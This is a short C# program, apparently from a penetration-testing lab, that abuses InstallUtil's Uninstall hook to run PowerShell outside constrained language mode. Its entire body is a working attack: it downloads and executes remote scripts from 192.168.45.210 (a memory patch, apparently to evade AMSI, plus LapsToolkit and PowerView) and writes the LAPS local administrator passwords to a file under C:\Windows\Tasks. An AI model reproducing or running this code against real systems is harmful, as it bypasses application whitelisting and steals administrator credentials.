using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace InstallUtil
{
    internal class Program
    {
        static void Main(string[] args)
        {
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        // functia de dezinstalare pe care o apeleaza installer-ul
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // comanda PS care va rula in mod FullLanguage
            String cmd = "(new-object system.net.webclient).downloadstring('http://192.168.45.210:80/memory-patch-session.ps1') | IEX; (new-object system.net.webclient).downloadstring('http://192.168.45.210:80/LapsToolkit.ps1') | IEX; (new-object system.net.webclient).downloadstring('http://192.168.45.210:80/PowerView.ps1') | IEX; Get-LAPSComputers > C:\\Windows\\Tasks\\pass.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
